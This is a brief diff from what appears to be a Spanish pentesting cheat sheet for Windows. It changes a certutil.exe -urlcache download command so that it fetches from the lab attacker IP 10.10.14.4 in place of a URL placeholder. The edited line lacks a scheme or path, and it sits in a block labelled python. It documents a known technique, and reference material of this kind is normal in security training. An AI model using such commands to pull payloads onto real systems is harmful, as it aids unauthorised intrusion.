@@ -101,7 +101,7 @@ netsh advfirewall firewall dump
 ### Descarga de archivos[](#descarga-de-archivos)
 
 ```python
-certutil.exe -urlcache -f <URL> <OUTPUT_FILE>
+certutil.exe -urlcache -f 10.10.14.4 <OUTPUT_FILE>
 ```
 ### Comprobación de permisos sobre un archivo
 
